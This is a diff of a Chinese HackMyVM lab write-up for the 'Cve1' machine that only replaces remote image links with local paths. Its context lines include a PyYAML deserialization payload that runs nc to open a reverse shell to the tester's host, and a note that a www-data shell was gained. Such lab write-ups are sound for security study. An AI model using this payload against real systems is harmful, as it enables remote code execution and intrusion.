@@ -10,7 +10,7 @@ tags:
   - Linux Machine
 ---
 
-![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768192533831-9505f27f-bade-4460-84f3-b6d7f06ac490.png)
+![](/image/hmvmachines/Cve1-1.png)
 
 # 信息收集
 ## IP定位
@@ -49,13 +49,13 @@ Nmap done: 1 IP address (1 host up) scanned in 29.71 seconds
 ```
 
 ## 80端口
-![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768192802646-91405867-93f6-46dd-b8e2-c5098945f0a4.png)
+![](/image/hmvmachines/Cve1-2.png)
 
 ### 目录扫描
 简单扫了下没啥东西，估计突破点在9090端口
 
 ## 9090端口
-![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768192729170-8e40049b-9a1d-4fc5-976b-18c9da236da7.png)
+![](/image/hmvmachines/Cve1-3.png)
 
 可以写入后缀为.yaml的文件然后在页面端进行文件名读取
 
@@ -145,7 +145,7 @@ id: !!python/object/apply:subprocess.Popen [["nc", "192.168.0.106", "4444", "-c"
 
 当我用名为“file”的名上传到服务器时（服务器会自动添加扩展名），我会看到类似 www-data 的 shell。
 
-![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768196933839-fced37aa-063f-40bd-b42b-14b13a8233d5.png)
+![](/image/hmvmachines/Cve1-4.png)
 
 我一直以为没有弹回来，结果是没有弹出tty命令行
 
